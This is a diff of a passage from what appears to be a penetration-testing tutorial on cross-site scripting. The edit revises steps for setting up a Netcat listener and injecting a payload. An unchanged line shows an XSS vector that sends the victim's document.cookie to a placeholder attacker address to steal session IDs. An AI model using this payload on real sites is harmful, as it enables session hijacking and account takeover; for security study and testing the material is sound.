@@ -19,9 +19,9 @@ exit;
 ```
 This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.
 
-Next we will start a Netcat listener, alternatively we can also use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh). Then we will use the following payload
-
-An attacker would then have to use the following XSS payload to
+Next we will start a Netcat listener, alternatively we can also use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh). Then we will use the following payload and inject it on the XSS-vulnerable form.
 ```txt
 <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://OUR_IP:OUR_PORT/log.php?c=' + document.cookie;"></video>
 ```
+
+Wait for our listener to receive the request and see the session IDs appended on the request.
